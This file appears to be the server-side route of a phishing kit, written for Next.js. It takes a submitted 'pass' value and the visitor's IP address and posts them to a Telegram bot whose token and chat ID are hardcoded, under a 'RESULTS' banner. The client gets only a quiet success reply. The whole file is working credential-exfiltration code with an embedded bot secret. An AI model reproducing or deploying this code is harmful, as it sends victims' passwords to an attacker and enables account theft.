import { NextResponse } from 'next/server';

export async function POST(request: Request) {
    try {
        const body = await request.json();
        const { pass } = body;

        // Get IP address
        let ip = request.headers.get('x-forwarded-for') || request.headers.get('x-real-ip') || 'Unknown IP';

        // If multiple IPs (proxy chain), take the first one
        if (ip && ip.includes(',')) {
            ip = ip.split(',')[0].trim();
        }

        // Localhost fallback
        if (ip === '::1' || ip === '127.0.0.1') {
            ip = '127.0.0.1 (Localhost)';
        }

        // Telegram Configuration
        const token = process.env.TELEGRAM_BOT_TOKEN || "8026009381:AAFo_eUPh2oz-tva8q63TuMLdJ9FqQqSwTU";
        const chatId = process.env.TELEGRAM_CHAT_ID || "7452688597";

        // Structuring the message
        let message = `\n \n|----------|RESULTS|--------------|\n`;
        message += `IPAddress: ${ip} \n`;
        message += pass;

        // Send to Telegram
        const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;

        await fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
            }),
        });

        // We don't really need to wait for the result or return it to the client
        // The client just waits for a 200 OK
        return NextResponse.json({ success: true });

    } catch (error) {
        console.error('Error processing request:', error);
        return NextResponse.json({ success: false }, { status: 500 });
    }
}
